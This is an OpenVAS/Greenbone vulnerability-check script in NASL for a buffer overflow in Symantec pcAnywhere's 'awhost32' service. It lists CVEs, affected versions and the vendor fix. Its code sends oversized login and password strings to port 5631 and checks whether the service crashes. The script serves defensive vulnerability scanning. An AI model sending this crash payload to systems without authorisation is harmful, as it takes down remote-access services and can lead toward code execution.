# SPDX-FileCopyrightText: 2012 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:symantec:pcanywhere";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802884");
  script_version("2025-03-20T05:38:32+0000");
  script_cve_id("CVE-2011-3478", "CVE-2011-3479", "CVE-2012-0292", "CVE-2012-0291");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"last_modification", value:"2025-03-20 05:38:32 +0000 (Thu, 20 Mar 2025)");
  script_tag(name:"creation_date", value:"2012-07-09 12:27:08 +0530 (Mon, 09 Jul 2012)");
  script_name("Symantec pcAnywhere 'awhost32' RCE Vulnerability");

  script_category(ACT_DENIAL);
  script_tag(name:"qod_type", value:"remote_analysis");
  script_copyright("Copyright (C) 2012 Greenbone AG");
  script_dependencies("gb_symantec_pcanywhere_access_server_detect.nasl");
  script_require_ports("Services/unknown", 5631);
  script_mandatory_keys("Symantec/pcAnywhere-server/Installed");
  script_family("Buffer overflow");

  script_tag(name:"impact", value:"Successful exploitation will allow attackers to cause buffer overflow
  condition or execute arbitrary code or cause a denial of service condition.");
  script_tag(name:"affected", value:"Symantec pcAnywhere version 12.5.x through 12.5.3

  Symantec pcAnywhere Solution shipped with Altiris IT Management Suite 7.0 (12.5.x)

  Symantec pcAnywhere Solution shipped with Altiris IT Management Suite 7.1 (12.6.x)");
  script_tag(name:"insight", value:"The host services component 'awhost32' fails to filter crafted long
  login and authentication data sent on TCP port 5631, which could be
  exploited by remote attackers to cause a buffer overflow condition.");
  script_tag(name:"solution", value:"Upgrade to Symantec pcAnywhere 12.5 SP4 or pcAnywhere Solution 12.6.7
  or Apply Symantec hotfix TECH182142.");
  script_tag(name:"summary", value:"Symantec pcAnywhere is prone to a remote code execution (RCE) vulnerability.");

  script_xref(name:"URL", value:"http://secunia.com/advisories/47744");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/51592");
  script_xref(name:"URL", value:"http://seclists.org/bugtraq/2012/Jan/154");
  script_xref(name:"URL", value:"http://seclists.org/bugtraq/2012/Jan/161");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/19407");
  script_xref(name:"URL", value:"http://www.zerodayinitiative.com/advisories/ZDI-12-018");
  script_xref(name:"URL", value:"http://www.symantec.com/security_response/securityupdates/detail.jsp?fid=security_advisory&pvid=security_advisory&year=2012&suid=20120301_00");

  script_tag(name:"solution_type", value:"VendorFix");

  script_xref(name:"URL", value:"http://www.symantec.com/security_response/securityupdates/detail.jsp?fid=security_advisory&pvid=security_advisory&year=2012&suid=20120124_00");
  exit(0);
}

include("host_details.inc");

if(!port = get_app_port(cpe:CPE))
  exit(0);

if(!get_app_location(cpe:CPE, port:port, nofork:TRUE))
  exit(0);

if(!soc = open_sock_tcp(port))
  exit(0);

# nb: Initial request
initial = raw_string(0x00, 0x00, 0x00, 0x00);
send(socket:soc, data:initial);
sleep(2);
resp = recv(socket:soc, length:1024);

# nb: Handshake Packet to Enter login details
handshake = raw_string(0x0d, 0x06, 0xfe);

# nb: Login Request
send(socket:soc, data:handshake);
resp = recv(socket:soc, length:1024);

if(!resp || "Enter login name" >!< resp) {
  close(soc);
  exit(0);
}

# nb: Malformed Username
pcuser = raw_string(crap(data:raw_string(0x41), length:30000));
pcuser = pcuser + pcuser + pcuser;

send(socket:soc, data: pcuser);
sleep(3);

# nb: Malformed Password
pcpass = raw_string(crap(data:raw_string(0x42), length:28000));
pcpass = pcpass + pcpass + pcpass;

send(socket:soc, data:pcpass);
close(soc);
sleep(3);

soc2 = open_sock_tcp(port);
if(!soc2) {
  security_message(port:port);
  exit(0);
} else {
  send(socket:soc2, data:initial);
  resp = recv(socket:soc2, length:1024);
  close(soc2);
  if(!resp) {
    security_message(port:port);
    exit(0);
  }
}

exit(99);
